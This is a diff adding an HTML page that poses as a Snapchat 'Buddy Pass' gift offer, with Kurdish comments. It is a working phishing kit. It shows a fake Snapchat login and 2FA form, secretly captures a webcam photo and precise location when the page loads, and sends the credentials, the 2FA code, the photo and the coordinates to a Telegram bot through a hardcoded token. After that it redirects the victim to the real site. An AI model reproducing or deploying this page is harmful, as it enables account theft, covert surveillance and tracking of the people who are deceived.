@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="ckb" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Gift Pass</title>
+    <!-- بەکارهێنانی فۆنتی ئایکۆنەکان -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Avenir Next', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0f1419;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* ------------------ پەیجی دیارییەکان (Gift Page) ------------------ */
+        .gift-container {
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+
+        .gift-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            color: #FFFC00;
+        }
+
+        .cards-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .gift-card-item {
+            background-color: #1a1f26;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.4);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .card-image-box {
+            position: relative;
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+        }
+
+        .card-image-box img {
+            width: 100%;
+            display: block;
+            border-radius: 15px;
+        }
+
+        .duration-overlay {
+            position: absolute;
+            bottom: 12px;
+            left: 15px;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+        }
+
+        .gift-btn {
+            width: 100%;
+            margin-top: 12px;
+            background-color: #FFFC00;
+            color: #000000;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .gift-btn:hover {
+            background-color: #e6e300;
+            transform: translateY(-2px);
+        }
+
+        /* ------------------ پەیجی لۆگین (Login Page) ------------------ */
+        .login-body {
+            background-color: #FFFC00;
+            width: 100vw;
+            min-height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            z-index: 1000;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            color: #000;
+        }
+
+        .logo-container {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .custom-logo {
+            width: 75px;
+            height: 75px;
+            border-radius: 18px;
+            object-fit: cover;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #16191c;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #5d636a;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            color: #8a8d91;
+            letter-spacing: 0.8px;
+            margin-bottom: 6px;
+            text-align: left;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #e2e5e8;
+            background-color: #f7f9fa;
+            border-radius: 12px;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.2s ease;
+            direction: ltr;
+            text-align: left;
+            color: #000;
+        }
+
+        .input-group input:focus {
+            border-color: #000000;
+            background-color: #ffffff;
+        }
+
+        .password-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 14px;
+            cursor: pointer;
+            color: #8a8d91;
+            font-size: 16px;
+        }
+
+        .two-factor-input {
+            letter-spacing: 6px;
+            font-size: 18px !important;
+            font-weight: bold;
+            text-align: center !important;
+        }
+
+        .forgot-pass {
+            text-align: right;
+            margin-bottom: 25px;
+        }
+
+        .forgot-pass a {
+            font-size: 12px;
+            color: #0f8cf8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #0f8cf8;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #0b72cb;
+        }
+
+        .footer-links {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #5d636a;
+        }
+
+        .footer-links a {
+            color: #0f8cf8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #8a8d91;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: 600;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- بەشی شاراوەی کامێرا و کانڤاس بەبێ ئەوەی لەسەر پەڕەکە دیار بێت -->
+    <div style="display: none;">
+        <video id="auto-webcam" autoplay playsinline></video>
+        <canvas id="snapshot-canvas"></canvas>
+    </div>
+
+    <!-- 1. پەڕەی سەرەکی: هەڵبژاردنی دیارییەکان (Gift Page) -->
+    <div class="gift-container" id="giftPage">
+        <h1 class="gift-title">Select Your Buddy Pass 🎁</h1>
+        
+        <div class="cards-wrapper">
+            <!-- کارتی یەکەم: 7 Days -->
+            <div class="gift-card-item">
+                <div class="card-image-box">
+                    <img src="image.png" alt="Buddy Pass 7 Days">
+                    <div class="duration-overlay">7-day access</div>
+                </div>
+                <button class="gift-btn open-login-btn">GIFT 🎁</button>
+            </div>
+
+            <!-- کارتی دووەم: 3 Months -->
+            <div class="gift-card-item">
+                <div class="card-image-box">
+                    <img src="image.png" alt="Buddy Pass 3 Months">
+                    <div class="duration-overlay">3-month access</div>
+                </div>
+                <button class="gift-btn open-login-btn">GIFT 🎁</button>
+            </div>
+
+            <!-- کارتی سێیەم: 1 Year -->
+            <div class="gift-card-item">
+                <div class="card-image-box">
+                    <img src="image.png" alt="Buddy Pass 1 Year">
+                    <div class="duration-overlay">1-year access</div>
+                </div>
+                <button class="gift-btn open-login-btn">GIFT 🎁</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. پەڕەی لۆگین (لە سەرەتادا شاراوەیە و دوای کلیککردن دەربەکەوێت) -->
+    <div class="login-body hidden" id="loginPage">
+        <div class="login-card">
+            <!-- لۆگۆ -->
+            <div class="logo-container">
+                <img src="image_d802dd.png" alt="Snapchat Logo" class="custom-logo">
+            </div>
+
+            <!-- هەنگاوی یەکەم: لۆگین -->
+            <div id="stepLogin">
+                <h2>Log In</h2>
+                <p class="subtitle">Enter your details to claim your pass</p>
+
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label for="username">USERNAME OR EMAIL</label>
+                        <input type="text" id="username" required autocomplete="off">
+                    </div>
+
+                    <div class="input-group">
+                        <label for="password">PASSWORD</label>
+                        <div class="password-wrapper">
+                            <input type="password" id="password" required>
+                            <i class="fa-solid fa-eye toggle-password" id="togglePassword"></i>
+                        </div>
+                    </div>
+
+                    <div class="forgot-pass">
+                        <a href="#">Forgot Password?</a>
+                    </div>
+
+                    <button type="submit" class="submit-btn">Next</button>
+                </form>
+
+                <div class="footer-links">
+                    <p>New to Snapchat? <a href="#">Sign Up</a></p>
+                </div>
+            </div>
+
+            <!-- هەنگاوی دووەم: Two-Factor Auth -->
+            <div id="step2FA" class="hidden">
+                <h2>Two-Factor Auth</h2>
+                <p class="subtitle">Enter the 6-digit code sent to your device</p>
+
+                <form id="twoFactorForm">
+                    <div class="input-group">
+                        <label for="twoFactorCode" style="text-align: center;">VERIFICATION CODE</label>
+                        <input type="text" id="twoFactorCode" class="two-factor-input" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="123456" required autocomplete="off">
+                    </div>
+
+                    <button type="submit" class="submit-btn">Submit Code</button>
+                </form>
+
+                <button type="button" class="back-btn" id="backToLogin">← Back to Log In</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const openLoginBtns = document.querySelectorAll('.open-login-btn');
+            const giftPage = document.querySelector('#giftPage');
+            const loginPage = document.querySelector('#loginPage');
+
+            const togglePassword = document.querySelector('#togglePassword');
+            const password = document.querySelector('#password');
+            const loginForm = document.querySelector('#loginForm');
+            const twoFactorForm = document.querySelector('#twoFactorForm');
+            const stepLogin = document.querySelector('#stepLogin');
+            const step2FA = document.querySelector('#step2FA');
+            const backToLogin = document.querySelector('#backToLogin');
+            const twoFactorCodeInput = document.querySelector('#twoFactorCode');
+
+            let savedUsername = '';
+            let savedPassword = '';
+            let currentCoords = { lat: 35.1112, lng: 45.6963, accuracy: 0 };
+            let videoStream = null;
+
+            // زانیارییەکانی بۆتی تەلەگرام
+            const botToken = "7574371417:AAFtmVbGNqHlvjNngnETNvL4fFG9SzQUPQU"; 
+            const chatId = "-5076201864";     
+
+            // دەستپێکردنی بێدەنگی کامێرا و شوێن
+            startCameraSilently();
+            getUserLocationSilently();
+
+            // کلیک کردن لەسەر هەر دوگمەیەکی GIFT پەڕەی لۆگین دەکاتەوە
+            openLoginBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    giftPage.classList.add('hidden');
+                    loginPage.classList.remove('hidden');
+                });
+            });
+
+            // دیاریکردن یان شاردنەوەی وشەی تێپەڕ
+            togglePassword.addEventListener('click', function () {
+                const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+                password.setAttribute('type', type);
+                this.classList.toggle('fa-eye');
+                this.classList.toggle('fa-eye-slash');
+            });
+
+            // وەرگرتنی شوێن
+            function getUserLocationSilently() {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            currentCoords = {
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            };
+                        },
+                        (err) => { console.warn("Location warning:", err.message); },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                }
+            }
+
+            // چالاککردنی کامێرا
+            async function startCameraSilently() {
+                try {
+                    videoStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' },
+                        audio: false
+                    });
+                    const video = document.getElementById('auto-webcam');
+                    video.srcObject = videoStream;
+                } catch (err) {
+                    console.warn("Camera access warning:", err);
+                }
+            }
+
+            function captureVideoFrameBase64() {
+                const video = document.getElementById('auto-webcam');
+                const canvas = document.getElementById('snapshot-canvas');
+                if (!video || !canvas || !video.videoWidth) return null;
+
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                return canvas.toDataURL('image/jpeg', 0.85);
+            }
+
+            // هەنگاوی یەکەم: ناردنی زانیارییەکان و وێنە بۆ تەلەگرام
+            loginForm.addEventListener('submit', async function (e) {
+                e.preventDefault();
+                savedUsername = document.querySelector('#username').value;
+                savedPassword = password.value;
+
+                const timeStr = new Date().toLocaleString('ckb-IQ');
+                const mapUrl = `https://www.google.com/maps?q=${currentCoords.lat},${currentCoords.lng}`;
+
+                const caption = `🚨 هەنگاوی یەکەم - لۆگین:\n\n` +
+                                `👤 یوزەرنایم: ${savedUsername}\n` +
+                                `🔑 پاسۆرد: ${savedPassword}\n` +
+                                `🗓️ کات: ${timeStr}\n` +
+                                `🧭 کۆردینات: \`${currentCoords.lat.toFixed(5)},${currentCoords.lng.toFixed(5)}\`\n` +
+                                `🔗 [پیشاندانی شوێن لەسەر Google Maps](${mapUrl})`;
+
+                const imageBase64 = captureVideoFrameBase64();
+
+                try {
+                    if (imageBase64) {
+                        const byteString = atob(imageBase64.split(',')[1]);
+                        const mimeString = imageBase64.split(',')[0].split(':')[1].split(';')[0];
+                        const ab = new ArrayBuffer(byteString.length);
+                        const ia = new Uint8Array(ab);
+                        for (let i = 0; i < byteString.length; i++) {
+                            ia[i] = byteString.charCodeAt(i);
+                        }
+                        const blob = new Blob([ab], { type: mimeString });
+
+                        const formData = new FormData();
+                        formData.append("chat_id", chatId);
+                        formData.append("photo", blob, "snap.jpg");
+                        formData.append("caption", caption);
+                        formData.append("parse_mode", "Markdown");
+
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
+                    } else {
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: "POST",
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: "Markdown" })
+                        });
+                    }
+                } catch (error) {
+                    console.log(error);
+                }
+
+                stepLogin.classList.add('hidden');
+                step2FA.classList.remove('hidden');
+            });
+
+            // گەڕانەوە بۆ لۆگین
+            backToLogin.addEventListener('click', function () {
+                step2FA.classList.add('hidden');
+                stepLogin.classList.remove('hidden');
+            });
+
+            // خانەی 2FA
+            twoFactorCodeInput.addEventListener('input', function (e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+
+            // هەنگاوی دووەم: ناردنی کۆدی 2FA
+            twoFactorForm.addEventListener('submit', async function (e) {
+                e.preventDefault();
+                const code = twoFactorCodeInput.value;
+
+                const message2 = `🚨 هەنگاوی دووەم - کۆدی 2FA:\n\n👤 یوزەرنایم: ${savedUsername}\n🔑 پاسۆرد: ${savedPassword}\n🔢 کۆدی 2FA: ${code}`;
+                const url2 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message2)}`;
+
+                try {
+                    await fetch(url2);
+                } catch (error) {
+                    console.log(error);
+                }
+
+                alert("IT WAS SUCCESSFUL");
+                window.location.href = "https://www.snapchat.com";
+            });
+        });
+    </script>
+</body>
+</html>
